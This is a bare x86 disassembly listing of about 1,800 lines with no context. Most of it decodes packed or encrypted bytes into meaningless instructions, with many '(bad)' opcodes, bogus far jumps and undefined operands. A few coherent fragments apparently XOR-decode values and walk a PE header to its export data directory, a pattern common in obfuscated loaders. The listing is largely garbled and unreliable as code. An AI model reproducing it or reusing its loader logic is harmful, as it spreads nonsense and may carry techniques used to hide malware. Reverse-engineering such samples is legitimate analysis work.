  40bd93:	cs jge 0x40be14
  40bd96:	jle    0x40bdd5
  40bd98:	dec    esi
  40bd99:	outs   dx,DWORD PTR ds:[esi]
  40bd9a:	(bad)  
  40bd9b:	jmp    0x40bd9a
  40bd9d:	jbe    0x40be1c
  40bd9f:	lea    esp,[edi-0x67cb22eb]
  40bda5:	repnz sahf 
  40bda7:	xchg   ebp,eax
  40bda8:	mov    ch,0xd2
  40bdaa:	jno    0x40be1e
  40bdac:	adc    edi,ebp
  40bdae:	inc    ecx
  40bdaf:	add    eax,0x3a2d7c04
  40bdb4:	sub    DWORD PTR [ebx+0x7f],ebp
  40bdb7:	xchg   esi,ebx
  40bdb9:	or     al,0x72
  40bdbb:	push   edx
  40bdbc:	or     DWORD PTR [ebx+0x26d38b07],0xffffffc6
  40bdc3:	pop    ds
  40bdc4:	out    dx,al
  40bdc5:	push   0x83b512ff
  40bdca:	test   ebx,ecx
  40bdcc:	idiv   DWORD PTR [eax+ebx*1+0x46]
  40bdd0:	mov    ebp,0xeb6563cf
  40bdd5:	int    0x69
  40bdd7:	jmp    0x40bdde
  40bdd9:	mov    al,ds:0x169cddf2
  40bdde:	pop    edx
  40bddf:	ret    
  40bde0:	dec    edi
  40bde1:	popa   
  40bde2:	push   ecx
  40bde3:	cmp    eax,0xdadf6e20
  40bde8:	and    ebp,DWORD PTR ds:0x95a27562
  40bdee:	imul   edi,ebp,0x9559c589
  40bdf4:	add    esi,ebx
  40bdf6:	xor    BYTE PTR [ebx+0x42],0xa2
  40bdfa:	xlat   BYTE PTR ds:[ebx]
  40bdfb:	cmp    dl,BYTE PTR [edi]
  40bdfd:	mov    edi,0x4f8427d
  40be02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be03:	sbb    edi,DWORD PTR [edi+0x2a7fd1bb]
  40be09:	fisttp DWORD PTR [ecx+edx*4-0x6c]
  40be0d:	add    al,0x7d
  40be0f:	js     0x40be8d
  40be11:	jle    0x40be43
  40be13:	sub    DWORD PTR [esi+ebp*4-0x76],0xffffff96
  40be18:	mov    ?,WORD PTR [ecx+0x1a]
  40be1b:	inc    esp
  40be1c:	fdiv   DWORD PTR [edx+edx*8]
  40be1f:	cdq    
  40be20:	loope  0x40bdc3
  40be22:	mov    cl,0xc1
  40be24:	scas   al,BYTE PTR es:[edi]
  40be25:	(bad)  [edx-0x1c]
  40be28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40be29:	mov    ds:0xd54bde49,eax
  40be2e:	add    eax,0xbed14472
  40be33:	scas   al,BYTE PTR es:[edi]
  40be34:	and    cl,BYTE PTR [ebp+eax*4+0x43acce21]
  40be3b:	add    ecx,DWORD PTR [ebx]
  40be3d:	pop    es
  40be3e:	gs sbb eax,0x441f9112
  40be44:	dec    ecx
  40be45:	stos   BYTE PTR es:[edi],al
  40be46:	bound  edx,QWORD PTR [edi-0x36]
  40be49:	int    0xca
  40be4b:	call   DWORD PTR [eax+ebx*4-0x3af8133c]
  40be52:	sbb    al,0x31
  40be54:	mov    eax,0xd6db7a9
  40be59:	jnp    0x40be3a
  40be5b:	sub    eax,0x434aa6fe
  40be60:	out    dx,eax
  40be61:	pop    ds
  40be62:	or     ah,0x2e
  40be65:	mov    es,WORD PTR [edi+0x47]
  40be68:	(bad)  
  40be69:	jle    0x40be6a
  40be6b:	fnstsw WORD PTR [edx-0x23a7ac23]
  40be71:	dec    ebx
  40be72:	jns    0x40be85
  40be74:	xchg   BYTE PTR [ebp+0x7ca605f6],al
  40be7a:	mov    eax,ecx
  40be7c:	stc    
  40be7d:	mov    dl,0x2b
  40be7f:	dec    ebx
  40be80:	fld    DWORD PTR ds:0x9bcbd922
  40be86:	add    DWORD PTR [edx+0xf],ebx
  40be89:	jnp    0x40beec
  40be8b:	daa    
  40be8c:	jo     0x40be63
  40be8e:	jmp    0xe088:0xd96e220a
  40be95:	mov    BYTE PTR [edx],al
  40be97:	popf   
  40be98:	inc    edx
  40be99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40be9b:	add    dl,BYTE PTR [eax-0x54]
  40be9e:	mov    BYTE PTR [edx],ah
  40bea0:	add    al,0xf8
  40bea2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bea3:	inc    ebp
  40bea4:	cli    
  40bea5:	outs   dx,BYTE PTR ds:[esi]
  40bea6:	push   esi
  40bea7:	mov    bl,0xb0
  40bea9:	inc    edx
  40beaa:	js     0x40bef8
  40beac:	pop    ds
  40bead:	push   ss
  40beae:	pushf  
  40beaf:	arpl   WORD PTR ds:0x8915c820,bx
  40beb5:	push   ebp
  40beb6:	and    dh,0x63
  40beb9:	cs xor eax,ebp
  40bebc:	mov    esi,0x23276744
  40bec1:	(bad)  
  40bec2:	clc    
  40bec3:	int3   
  40bec4:	ret    
  40bec5:	push   edi
  40bec6:	mov    ah,0xa
  40bec8:	ret    0x2572
  40becb:	sub    bh,bl
  40becd:	js     0x40bea3
  40becf:	xchg   esi,eax
  40bed0:	ficomp WORD PTR [ebx-0x3a5debbb]
  40bed6:	adc    BYTE PTR [esi+0x722adee7],bl
  40bedc:	bound  ecx,QWORD PTR [ecx-0x1a940a68]
  40bee2:	add    ebx,DWORD PTR [ecx+0xa]
  40bee5:	jmp    0x9365:0xd19c9d42
  40beec:	pop    ds
  40beed:	leave  
  40beee:	(bad)  
  40beef:	mov    eax,0xf4eb6f76
  40bef4:	rcl    DWORD PTR [ecx],0xfb
  40bef7:	int3   
  40bef8:	mov    dh,0x1e
  40befa:	pop    edi
  40befb:	mov    al,BYTE PTR [ebx]
  40befd:	into   
  40befe:	out    dx,al
  40beff:	bound  edx,QWORD PTR [ebx]
  40bf01:	retf   0xb0c0
  40bf04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bf05:	mov    bl,cl
  40bf07:	mov    al,0xd3
  40bf09:	das    
  40bf0a:	or     DWORD PTR [ecx+0x739db74b],0x9823ff5f
  40bf14:	pop    edx
  40bf15:	push   esi
  40bf16:	popf   
  40bf17:	cmp    bh,0xee
  40bf1a:	bound  ebx,QWORD PTR [edx-0x43]
  40bf1d:	cmp    BYTE PTR [eax-0xe],ah
  40bf20:	jmp    0xbb81:0x4e8fecea
  40bf27:	mov    eax,?
  40bf29:	xchg   BYTE PTR [ecx+0x8],dl
  40bf2c:	inc    eax
  40bf2d:	nop
  40bf2e:	jne    0x40beeb
  40bf30:	sbb    eax,0xd452a808
  40bf35:	ret    
  40bf36:	mov    bl,bl
  40bf38:	xchg   edx,eax
  40bf39:	jmp    0x40bfb6
  40bf3b:	clc    
  40bf3c:	push   es
  40bf3d:	fst    DWORD PTR [ebx]
  40bf3f:	int3   
  40bf40:	je     0x46b9bc07
  40bf46:	jnp    0x40bf8c
  40bf48:	xchg   DWORD PTR [edx],ebp
  40bf4a:	jl     0x40bfc4
  40bf4c:	adc    esi,0x18
  40bf4f:	or     bl,BYTE PTR [eax+0x77d35e03]
  40bf55:	mov    DWORD PTR [eax],0x2cabf030
  40bf5b:	cmp    eax,esp
  40bf5d:	cmc    
  40bf5e:	pop    edi
  40bf5f:	inc    edi
  40bf60:	and    BYTE PTR [ecx],bl
  40bf62:	pop    ebp
  40bf63:	cld    
  40bf64:	scas   eax,DWORD PTR es:[edi]
  40bf65:	jae    0x40bfc3
  40bf67:	pop    ebx
  40bf68:	test   BYTE PTR [ecx-0x5442d64d],cl
  40bf6e:	pop    esp
  40bf6f:	adc    DWORD PTR [ebx+0x7f],0x1b7f067d
  40bf76:	mov    al,0xe1
  40bf78:	xlat   BYTE PTR ds:[ebx]
  40bf79:	cmp    DWORD PTR [edi+0x33b8fa2],ecx
  40bf7f:	fcompp 
  40bf81:	add    BYTE PTR [esi-0x2],dh
  40bf84:	sbb    edi,DWORD PTR [ebx]
  40bf86:	or     al,BYTE PTR [eax+0x5b]
  40bf89:	sahf   
  40bf8a:	xchg   esi,eax
  40bf8b:	mov    BYTE PTR [eax-0x1c1f29c],bl
  40bf91:	int3   
  40bf92:	sub    BYTE PTR [edi+0x64],bl
  40bf95:	mov    WORD PTR [ecx-0x65b6b354],ds
  40bf9b:	xor    al,0xc
  40bf9d:	arpl   WORD PTR [ecx+eiz*1+0x592b2ea5],sp
  40bfa4:	arpl   ax,cx
  40bfa6:	inc    eax
  40bfa7:	jo     0x40bf59
  40bfa9:	mov    bl,al
  40bfab:	popa   
  40bfac:	dec    eax
  40bfad:	dec    eax
  40bfae:	inc    ebp
  40bfaf:	icebp  
  40bfb0:	sub    eax,0x6c942d7c
  40bfb5:	and    ebp,0xb4f2fb2c
  40bfbb:	test   BYTE PTR [edx-0x25],0xa4
  40bfbf:	mov    ecx,0xe090a588
  40bfc4:	test   BYTE PTR [eax+0x57302cce],dh
  40bfca:	mov    edi,0x2b7104f2
  40bfcf:	sbb    edi,ebp
  40bfd1:	shl    DWORD PTR [ebx-0x6f],cl
  40bfd4:	xor    eax,0x6ce0b379
  40bfd9:	push   esp
  40bfda:	dec    esp
  40bfdb:	xchg   esp,eax
  40bfdc:	xchg   ebp,eax
  40bfdd:	push   edx
  40bfde:	in     eax,dx
  40bfdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bfe0:	test   DWORD PTR [eax-0x2d2f4353],0xa8244d04
  40bfea:	cmp    BYTE PTR [edx],dh
  40bfec:	pop    edx
  40bfed:	mov    ds:0x8785f8a6,eax
  40bff2:	cdq    
  40bff3:	xor    edx,DWORD PTR ds:0x90f5c91
  40bff9:	push   0x54
  40bffb:	pop    ebp
  40bffc:	lods   al,BYTE PTR ds:[esi]
  40bffd:	mov    al,ds:0x4cae348
  40c002:	inc    edi
  40c003:	lahf   
  40c004:	dec    ebp
  40c005:	pop    ds
  40c006:	add    BYTE PTR [esi-0x50faca6a],ch
  40c00c:	cs add eax,ecx
  40c00f:	outs   dx,BYTE PTR ds:[esi]
  40c010:	mov    bl,0x57
  40c012:	sbb    cl,dh
  40c014:	mov    WORD PTR [edx+0x45ac7b89],gs
  40c01a:	sar    BYTE PTR [edi-0x1f749d86],0x4c
  40c021:	sub    al,0x39
  40c023:	push   edi
  40c024:	sub    edx,eax
  40c026:	push   ss
  40c027:	dec    esi
  40c028:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c029:	push   ecx
  40c02a:	ss in  eax,dx
  40c02c:	lods   al,BYTE PTR ds:[esi]
  40c02d:	adc    al,0xe5
  40c02f:	pop    ebp
  40c030:	push   ss
  40c031:	sahf   
  40c032:	clc    
  40c033:	jg     0x40c091
  40c035:	and    cl,dh
  40c037:	pop    ebx
  40c038:	mov    ah,0xe
  40c03a:	push   ebx
  40c03b:	(bad)  
  40c03c:	(bad)  
  40c03d:	sub    BYTE PTR [ebp+0x21],al
  40c040:	push   0xffffffab
  40c042:	xchg   ebx,eax
  40c043:	retf   
  40c044:	lds    esp,FWORD PTR [ebp-0x2667202b]
  40c04a:	cmp    DWORD PTR [edx-0x5d4b6bb],eax
  40c050:	xchg   BYTE PTR [edi-0x5c],ah
  40c053:	sbb    bh,dh
  40c055:	inc    eax
  40c056:	jne    0x40c050
  40c058:	xor    esp,esi
  40c05a:	xchg   edi,eax
  40c05b:	dec    esi
  40c05c:	rol    DWORD PTR [eax],0x9e
  40c05f:	mov    ebp,0xa230a7d5
  40c064:	sbb    al,ch
  40c066:	retf   0xa123
  40c069:	popa   
  40c06a:	sbb    esp,DWORD PTR [ebp+0x22]
  40c06d:	xchg   edx,eax
  40c06e:	(bad)  
  40c070:	(bad)  
  40c071:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c073:	push   ecx
  40c074:	test   al,0xd3
  40c076:	inc    edi
  40c077:	mov    al,0xde
  40c079:	jle    0x40c086
  40c07b:	clc    
  40c07c:	mov    al,ds:0x6e7fb363
  40c081:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c082:	test   eax,0x69626e3d
  40c087:	in     eax,dx
  40c088:	push   0xffffffbd
  40c08a:	daa    
  40c08b:	repnz ror ah,1
  40c08e:	xchg   esp,eax
  40c08f:	jecxz  0x40c0b5
  40c091:	dec    esi
  40c092:	push   edi
  40c093:	push   0xfffffff3
  40c095:	rcr    DWORD PTR [ebx+0x22],1
  40c098:	xchg   ebx,eax
  40c099:	stos   DWORD PTR es:[edi],eax
  40c09a:	jp     0x40c0d1
  40c09c:	adc    ebx,eax
  40c09e:	sbb    ebp,0xfffffffb
  40c0a1:	out    0x98,eax
  40c0a3:	dec    ebx
  40c0a4:	jae    0x40c0d6
  40c0a6:	out    dx,eax
  40c0a7:	popa   
  40c0a8:	cld    
  40c0a9:	jae    0x40c037
  40c0ab:	dec    eax
  40c0ac:	and    dh,BYTE PTR [ecx-0x4b7870cc]
  40c0b2:	dec    ebx
  40c0b3:	xor    edx,esp
  40c0b5:	fisubr DWORD PTR [edx]
  40c0b7:	aaa    
  40c0b8:	xor    eax,0x232693a0
  40c0bd:	cmp    al,0xd2
  40c0bf:	dec    ebx
  40c0c0:	mov    bl,cl
  40c0c2:	mov    ds:0xa92d7c30,eax
  40c0c7:	sub    ecx,eax
  40c0c9:	mov    ax,WORD PTR [ebp-0x4]
  40c0cd:	movzx  eax,ax
  40c0d0:	sub    ecx,edi
  40c0d2:	cmp    eax,ecx
  40c0d4:	mov    eax,DWORD PTR [ebp-0x14]
  40c0d7:	movzx  ecx,WORD PTR [ebp-0x4]
  40c0db:	jg     0x40c0f0
  40c0e1:	xor    eax,esi
  40c0e3:	sub    ecx,eax
  40c0e5:	sub    ecx,edi
  40c0e7:	mov    WORD PTR [ebp-0x4],cx
  40c0eb:	jmp    0x40c44a
  40c0f0:	xor    eax,esi
  40c0f2:	jmp    0x40c43f
  40c0f7:	nop
  40c0f8:	push   esp
  40c0f9:	in     al,dx
  40c0fa:	shr    eax,1
  40c0fc:	jno    0x40c0af
  40c0fe:	push   ebp
  40c0ff:	mov    ss,WORD PTR [ecx+esi*8+0x70]
  40c103:	mov    al,ds:0x693391f9
  40c108:	sti    
  40c109:	jle    0x40c189
  40c10b:	cs jge 0x40c18c
  40c10e:	jle    0x40c09e
  40c110:	shl    DWORD PTR [ebp-0x4c],cl
  40c113:	test   BYTE PTR [ecx+eax*8+0x38a14ec3],dh
  40c11a:	outs   dx,DWORD PTR ds:[esi]
  40c11b:	enter  0x44bb,0xb3
  40c11f:	push   ebx
  40c120:	loopne 0x40c0ea
  40c122:	xor    ch,dl
  40c124:	pushf  
  40c125:	ss addr16 mov ecx,0x9209c2ff
  40c12c:	jae    0x40c185
  40c12e:	dec    edx
  40c12f:	leave  
  40c130:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c131:	mov    ah,0x36
  40c133:	sub    bh,dh
  40c135:	sahf   
  40c136:	dec    esp
  40c137:	shr    dl,cl
  40c139:	lods   al,BYTE PTR ds:[esi]
  40c13a:	fidivr WORD PTR [edx]
  40c13c:	fs cld 
  40c13e:	or     dh,BYTE PTR [ecx+0x23]
  40c141:	jne    0x40c112
  40c143:	neg    BYTE PTR [edx]
  40c145:	into   
  40c146:	gs popf 
  40c148:	addr16 jmp 0x40c179
  40c14b:	sub    esp,eax
  40c14d:	and    ch,cl
  40c14f:	je     0x40c169
  40c151:	arpl   WORD PTR [edi+0x39dc7fd5],si
  40c157:	out    0x1c,al
  40c159:	rcr    DWORD PTR [edi-0x5108539],1
  40c15f:	fs popa 
  40c161:	cmp    eax,0xd2ff5822
  40c166:	adc    al,0x55
  40c168:	jmp    0x40c10a
  40c16a:	inc    eax
  40c16b:	jb     0x40c179
  40c16d:	iret   
  40c16e:	lods   al,BYTE PTR ds:[esi]
  40c16f:	push   es
  40c170:	call   0xc07f:0x1d224ea7
  40c177:	mov    dl,0x8
  40c179:	mov    esp,0xc29814c7
  40c17e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c17f:	mov    dh,0xe9
  40c181:	nop
  40c182:	test   al,0x45
  40c184:	dec    ebp
  40c185:	and    ah,BYTE PTR [eax+0x34422d0a]
  40c18b:	js     0x40c152
  40c18d:	ins    BYTE PTR es:[edi],dx
  40c18e:	add    esp,0x2c
  40c191:	arpl   WORD PTR [ecx],bx
  40c193:	enter  0xd62c,0x8
  40c197:	or     edi,0x4
  40c19a:	push   0xffffffa4
  40c19c:	push   esi
  40c19d:	add    ebp,edi
  40c19f:	popf   
  40c1a0:	mov    edi,esp
  40c1a2:	and    ch,BYTE PTR [eax+0x296de6ac]
  40c1a8:	sub    DWORD PTR [esi+0x4c],edi
  40c1ab:	rcr    BYTE PTR [ecx-0x1d],0x9a
  40c1af:	lahf   
  40c1b0:	std    
  40c1b1:	imul   eax,esp,0xb7572759
  40c1b7:	imul   ebx,DWORD PTR [ecx],0x54
  40c1ba:	iret   
  40c1bb:	push   0x52a87e75
  40c1c0:	pop    edx
  40c1c1:	cmp    al,0xcb
  40c1c3:	push   esi
  40c1c4:	inc    ebp
  40c1c5:	(bad)  
  40c1c6:	pop    ds
  40c1c7:	lods   eax,DWORD PTR ds:[esi]
  40c1c8:	pop    ss
  40c1c9:	push   edx
  40c1ca:	xor    al,0x3e
  40c1cc:	loope  0x40c203
  40c1ce:	sahf   
  40c1cf:	inc    ecx
  40c1d0:	out    dx,eax
  40c1d1:	push   DWORD PTR [edx+esi*1+0x46]
  40c1d5:	mov    ecx,0x4d9fd2b0
  40c1da:	popf   
  40c1db:	sbb    ah,cl
  40c1dd:	arpl   WORD PTR [esi-0x785ac49a],dx
  40c1e3:	push   0x48
  40c1e5:	dec    ecx
  40c1e6:	mov    BYTE PTR [ebx+0x4911f6ca],cl
  40c1ec:	rcl    dh,0x84
  40c1ef:	inc    edx
  40c1f0:	add    DWORD PTR [ebp-0x57],0xd9f9c92e
  40c1f7:	dec    ecx
  40c1f8:	mov    es,WORD PTR [esi+esi*1+0x2c33f90e]
  40c1ff:	add    al,0x7f
  40c201:	setle  ah
  40c204:	adc    al,0x3d
  40c206:	sub    BYTE PTR [ebx],ch
  40c208:	inc    ebp
  40c209:	mov    eax,ebx
  40c20b:	push   cs
  40c20c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c20d:	inc    edi
  40c20e:	fidivr WORD PTR [edx+0x3b]
  40c211:	inc    esp
  40c212:	push   ss
  40c213:	(bad)  
  40c214:	jne    0x40c1d4
  40c216:	mov    esi,ecx
  40c218:	lahf   
  40c219:	cwde   
  40c21a:	xchg   esi,eax
  40c21b:	sahf   
  40c21c:	sbb    eax,0xba43e902
  40c221:	or     BYTE PTR [ebp-0x46],bl
  40c224:	mov    ds:0xa2ae3974,eax
  40c229:	adc    eax,0xe113fd18
  40c22e:	mov    ch,bh
  40c230:	in     al,0x11
  40c232:	or     ah,BYTE PTR [ebx+0x206f2b0f]
  40c238:	mov    bl,0x61
  40c23a:	fnstcw WORD PTR [ecx+0x6b]
  40c23d:	pop    es
  40c23e:	int    0xc7
  40c240:	mov    ds:0x89619e92,eax
  40c245:	push   ebp
  40c246:	loopne 0x40c293
  40c248:	enter  0x8769,0xc1
  40c24c:	das    
  40c24d:	ret    0xcd8d
  40c250:	lds    edx,FWORD PTR [ecx-0x19]
  40c253:	push   eax
  40c254:	fsubrp st(4),st
  40c256:	inc    esp
  40c257:	mov    ebx,0xfb8d86d4
  40c25c:	xor    al,0x67
  40c25e:	call   0x1e8e:0x330ceb5e
  40c265:	inc    ebp
  40c266:	clc    
  40c267:	add    ecx,ecx
  40c269:	pop    ecx
  40c26a:	dec    esp
  40c26b:	mov    edx,0xc50b1fdc
  40c270:	ds (bad) 
  40c273:	mov    bh,0x11
  40c275:	jne    0x40c29a
  40c277:	mov    ebx,0xa3f72525
  40c27c:	aad    0xcc
  40c27e:	and    eax,ebp
  40c280:	popf   
  40c281:	dec    esi
  40c282:	retf   
  40c283:	(bad)  
  40c284:	xchg   ecx,eax
  40c285:	mov    al,0x3b
  40c287:	je     0x40c2c7
  40c289:	pop    edi
  40c28a:	xlat   BYTE PTR ds:[ebx]
  40c28b:	mov    eax,0x687fa5ad
  40c290:	xchg   esp,eax
  40c291:	add    eax,0xd1614d18
  40c296:	test   edx,edx
  40c298:	sbb    DWORD PTR [ebx+0xf],ebp
  40c29b:	xchg   ebx,eax
  40c29c:	mov    WORD PTR [ebx-0x7a],ds
  40c29f:	xor    al,0xd0
  40c2a1:	fdivr  st(1),st
  40c2a3:	clc    
  40c2a4:	add    BYTE PTR [ebp+0x1851016a],bh
  40c2aa:	and    cl,cl
  40c2ac:	pop    eax
  40c2ad:	out    0x85,al
  40c2af:	dec    ecx
  40c2b0:	imul   esi,DWORD PTR [esi-0x1e],0x5db7a20f
  40c2b7:	add    ebx,DWORD PTR ds:0xb2b0b3ab
  40c2bd:	test   DWORD PTR [edi],ebx
  40c2bf:	inc    ecx
  40c2c0:	add    DWORD PTR [edi+0x73150ff],esi
  40c2c6:	cwd    
  40c2c8:	mov    cl,0x6f
  40c2ca:	ret    0xc7ff
  40c2cd:	in     al,dx
  40c2ce:	cld    
  40c2cf:	adc    al,BYTE PTR [esi+edx*8]
  40c2d2:	dec    edx
  40c2d3:	adc    DWORD PTR [esi+0x1fd0242e],ebp
  40c2d9:	cmp    eax,0x71bb81cc
  40c2de:	sub    ebx,DWORD PTR [edi+0x70]
  40c2e1:	sub    BYTE PTR [ecx],ch
  40c2e3:	es ins BYTE PTR es:[edi],dx
  40c2e5:	stos   DWORD PTR es:[edi],eax
  40c2e6:	jg     0x40c2f0
  40c2e8:	xlat   BYTE PTR ds:[ebx]
  40c2e9:	sub    dl,BYTE PTR [eax-0x1b80a6c6]
  40c2ef:	and    DWORD PTR fs:[ebx+0x37b47e2c],ebp
  40c2f6:	and    ch,bl
  40c2f8:	inc    edi
  40c2f9:	stc    
  40c2fa:	pop    ss
  40c2fb:	mov    al,0x9
  40c2fd:	add    BYTE PTR [esi+0x61],dh
  40c300:	push   edx
  40c301:	cld    
  40c302:	fisttp WORD PTR [eax+0x3f]
  40c305:	cmc    
  40c306:	jle    0x40c36c
  40c308:	sbb    ecx,esi
  40c30a:	xchg   BYTE PTR [esi],dh
  40c30c:	fwait
  40c30d:	inc    edi
  40c30e:	inc    ebx
  40c30f:	test   eax,0x36593ec6
  40c314:	jp     0x40c2e0
  40c316:	into   
  40c317:	ret    0x6523
  40c31a:	cmp    al,0xf7
  40c31c:	fnstenv [ebp-0x2a]
  40c31f:	dec    esp
  40c320:	pop    ebx
  40c321:	xchg   BYTE PTR [ebp+0x69d30280],ah
  40c327:	ror    cl,1
  40c329:	push   ecx
  40c32a:	std    
  40c32b:	xchg   edx,eax
  40c32c:	sub    bh,BYTE PTR [edi]
  40c32e:	int    0x78
  40c330:	cmp    BYTE PTR [ebx-0x1b],dh
  40c333:	aad    0xfe
  40c335:	in     al,0xf0
  40c337:	add    eax,0xe3680876
  40c33c:	jmp    0x40c342
  40c33e:	adc    cl,BYTE PTR [esi]
  40c340:	out    0xf2,al
  40c342:	mov    ds:0x3c3a6386,al
  40c347:	js     0x40c2de
  40c349:	or     BYTE PTR [ebx+0x4a],ah
  40c34c:	(bad)  
  40c34d:	and    ecx,DWORD PTR [eax]
  40c34f:	adc    al,0xec
  40c351:	sbb    eax,0x2ad2fd35
  40c356:	clc    
  40c357:	stos   BYTE PTR es:[edi],al
  40c358:	jno    0x40c336
  40c35a:	loopne 0x40c2df
  40c35c:	iret   
  40c35d:	mov    ecx,0x5160b724
  40c362:	add    ebx,DWORD PTR [ebp+0x57]
  40c365:	fcomp  st(5)
  40c367:	pop    ebx
  40c368:	fild   WORD PTR [ebx]
  40c36a:	(bad)  
  40c36b:	repz mov bl,0xbc
  40c36e:	mov    cl,0xdd
  40c370:	sbb    dx,bp
  40c373:	xlat   BYTE PTR ds:[ebx]
  40c374:	les    edx,FWORD PTR [esi+0x4d8958cd]
  40c37a:	jl     0x40c3af
  40c37c:	shr    BYTE PTR [eax+ecx*1],0xcb
  40c380:	or     DWORD PTR [esi-0x76],0x65
  40c384:	inc    esi
  40c385:	sbb    BYTE PTR [ebx],dl
  40c387:	pop    edx
  40c388:	int3   
  40c389:	nop
  40c38a:	xor    ch,BYTE PTR [edi+0x5468cca4]
  40c390:	dec    edi
  40c391:	lock add eax,0xb99202da
  40c397:	je     0x40c32a
  40c399:	aaa    
  40c39a:	sti    
  40c39b:	cmp    al,BYTE PTR [edx+0x4a]
  40c39e:	mov    BYTE PTR [edx],ah
  40c3a0:	(bad)  
  40c3a1:	std    
  40c3a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c3a3:	sqrtps xmm3,XMMWORD PTR [esi-0x57]
  40c3a7:	std    
  40c3a8:	fnstsw WORD PTR [edx+0x1c]
  40c3ab:	adc    DWORD PTR [edx+ebx*8+0x3a1d12a6],edi
  40c3b2:	in     al,dx
  40c3b3:	dec    esi
  40c3b4:	cs sub esp,edx
  40c3b7:	je     0x40c340
  40c3b9:	push   edx
  40c3ba:	sub    BYTE PTR [edx+edi*8],al
  40c3bd:	arpl   WORD PTR [ebp-0x9a1e2d0],ax
  40c3c3:	xor    edx,ebp
  40c3c5:	retf   
  40c3c6:	jae    0x40c3a1
  40c3c8:	sub    cl,dl
  40c3ca:	popf   
  40c3cb:	jo     0x40c38a
  40c3cd:	cs xor bh,dl
  40c3d0:	test   DWORD PTR [edi],esp
  40c3d2:	popa   
  40c3d3:	stos   DWORD PTR es:[edi],eax
  40c3d4:	mov    edx,0x18d1bf86
  40c3d9:	add    eax,0x3efa9501
  40c3de:	pop    edx
  40c3df:	into   
  40c3e0:	push   esp
  40c3e1:	mov    ds,WORD PTR [edx]
  40c3e3:	pop    es
  40c3e4:	jecxz  0x40c37e
  40c3e6:	shl    edi,1
  40c3e8:	dec    eax
  40c3e9:	xor    eax,DWORD PTR [esi-0x5b]
  40c3ec:	cmp    eax,DWORD PTR [eax-0xd2a61e]
  40c3f2:	fs retf 0x7379
  40c3f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3f7:	jne    0x40c42b
  40c3f9:	fmulp  st(2),st
  40c3fb:	pop    ebp
  40c3fc:	cwde   
  40c3fd:	inc    edi
  40c3fe:	adc    eax,0xc64f2681
  40c403:	jl     0x40c3b6
  40c405:	stos   BYTE PTR es:[edi],al
  40c406:	daa    
  40c407:	arpl   WORD PTR [ecx],bx
  40c409:	dec    ecx
  40c40a:	lods   eax,DWORD PTR ds:[esi]
  40c40b:	repz and BYTE PTR [edi],ah
  40c40e:	scas   eax,DWORD PTR es:[edi]
  40c40f:	loope  0x40c395
  40c411:	inc    ebp
  40c412:	pop    ds
  40c413:	xor    al,ah
  40c415:	inc    ecx
  40c416:	neg    edi
  40c418:	pop    es
  40c419:	xchg   BYTE PTR [ebx+0x1107a99d],ah
  40c41f:	std    
  40c420:	popf   
  40c421:	es pop bx
  40c424:	adc    DWORD PTR [eax+0x58],ebx
  40c427:	(bad)  
  40c428:	sbb    edi,DWORD PTR [edx-0x3160fcb8]
  40c42e:	(bad)  
  40c42f:	xor    BYTE PTR [esi+0x31],dl
  40c432:	pop    ebx
  40c433:	in     eax,dx
  40c434:	lahf   
  40c435:	inc    eax
  40c436:	dec    esp
  40c437:	enter  0x1b28,0xbd
  40c43b:	lds    esp,FWORD PTR [ecx-0x24]
  40c43e:	jge    0x72dbccc8
  40c444:	xor    al,BYTE PTR [eax]
  40c446:	mov    WORD PTR [ebp-0x4],ax
  40c44a:	mov    eax,DWORD PTR [ebp-0xc]
  40c44d:	cmp    eax,ebx
  40c44f:	je     0x40c463
  40c455:	mov    eax,DWORD PTR [ebp-0x8]
  40c458:	mov    DWORD PTR [eax],0x60341e89
  40c45e:	jmp    0x40cba4
  40c463:	mov    eax,DWORD PTR [ebp+0x8]
  40c466:	mov    ecx,DWORD PTR [ebp-0x8]
  40c469:	xor    eax,esi
  40c46b:	add    eax,edi
  40c46d:	cmp    DWORD PTR [ecx],eax
  40c46f:	je     0x40cb8c
  40c475:	mov    ecx,DWORD PTR [ebp-0x18]
  40c478:	mov    eax,DWORD PTR [ebp-0x8]
  40c47b:	mov    eax,DWORD PTR [eax]
  40c47d:	mov    eax,DWORD PTR [eax+0x3c]
  40c480:	lea    ecx,[ecx*8+0x78]
  40c487:	add    eax,ecx
  40c489:	jmp    0x40c7d6
  40c48e:	ffree  st(2)
  40c490:	les    esp,FWORD PTR ds:0xc2dd21e1
  40c496:	xchg   ebp,eax
  40c497:	(bad)  
  40c498:	sub    edx,DWORD PTR [edi+0x18]
  40c49b:	jns    0x40c46a
  40c49d:	xor    DWORD PTR [ecx],ebx
  40c49f:	xchg   DWORD PTR [esi+0x7e],edi
  40c4a2:	cs jge 0x40c523
  40c4a5:	jle    0x40c472
  40c4a7:	add    BYTE PTR [ebx+ebx*4],dl
  40c4aa:	inc    ebp
  40c4ab:	xor    BYTE PTR [ebp-0x12b2284d],dl
  40c4b1:	push   eax
  40c4b2:	cmp    BYTE PTR [edx+eax*4-0x398dd3c6],0xe3
  40c4ba:	fucompp 
  40c4bc:	xor    ebx,eax
  40c4be:	pop    eax
  40c4bf:	pop    esi
  40c4c0:	rol    DWORD PTR [esi+0x6e],1
  40c4c3:	pop    edx
  40c4c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c4c5:	xor    eax,0x755cb480
  40c4ca:	rcr    DWORD PTR [di-0x34],1
  40c4ce:	pusha  
  40c4cf:	dec    edi
  40c4d0:	loopne 0x40c457
  40c4d2:	and    al,0x78
  40c4d4:	mov    edi,0x935efcea
  40c4d9:	loop   0x40c4cb
  40c4db:	add    al,0x77
